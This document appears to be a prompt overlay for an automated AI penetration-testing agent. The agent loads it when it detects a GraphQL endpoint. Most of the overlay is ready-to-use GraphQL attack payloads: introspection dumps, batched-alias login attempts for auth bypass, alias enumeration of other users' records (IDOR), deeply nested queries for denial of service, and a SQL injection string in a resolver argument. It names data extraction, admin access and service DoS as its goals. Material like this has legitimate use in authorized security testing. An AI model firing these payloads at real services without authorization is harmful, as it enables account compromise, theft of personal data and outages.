# GraphQL — Dynamic Overlay

## Metadata
- **Exploit Type**: graphql
- **Applies To**: Gamma, Specialist (auto-spawned)
- **Loading**: Appended when `/graphql` endpoint detected or `exploit_type === "graphql"`

---

## OVERLAY_CONTEXT

GraphQL security issues include introspection enabled, query complexity attacks, batched query attacks, alias abuse for auth bypass, and injection via resolver parameters. Success indicators: data extraction, admin access, or service DoS.

---

## Introspection Discovery

### Check if Introspection Enabled
```graphql
query { __schema { types { name } } }
```

### Full Introspection
```graphql
query {
  __schema {
    queryType { name }
    types {
      name
      fields {
        name
        type { name }
        args { name type { name } }
      }
    }
  }
}
```

---

## Query Batching / Alias Attacks

### Batch Auth Bypass
```graphql
query {
  a: login(user: "admin", pass: "wrong")
  b: login(user: "admin", pass: "correct")
}
```

### Alias for IDOR
```graphql
query {
  user1: user(id: "1") { name email }
  user2: user(id: "2") { name email }
  user3: user(id: "3") { name email }
}
```

---

## Query Complexity Attacks

### Deep Nested Query
```graphql
query {
  author(id: 1) {
    posts {
      comments {
        author {
          posts {
            comments {
              author { posts { ... } }
            }
          }
        }
      }
    }
  }
}
```

### Expensive Field Query
```graphql
query { users { posts { comments { author { posts { ... } } } } }
```

---

## Field Enumeration

```graphql
query { __type(name: "User") { fields { name type { name kind } } } }
```

---

## Injection in Resolver Arguments

### Basic Test
```graphql
query { user(id: "1 OR 1=1") { name } }
```

### Union Injection
```graphql
query {
  search(text: "admin") {
    ... on User { name email }
    ... on Admin { secretData }
  }
}
```

---

## Constraints

```
- ALWAYS disable introspection in production (first finding: introspection enabled)
- Query batching: test if server processes all queries before responding
- Complexity limit bypass: use aliases to chain multiple queries
- GraphQL is typically POST-only — OPTIONS request reveals if POST allowed
- For NoSQL injection: test MongoDB-specific operators in arguments
```

---

*Overlay version: 1.0*
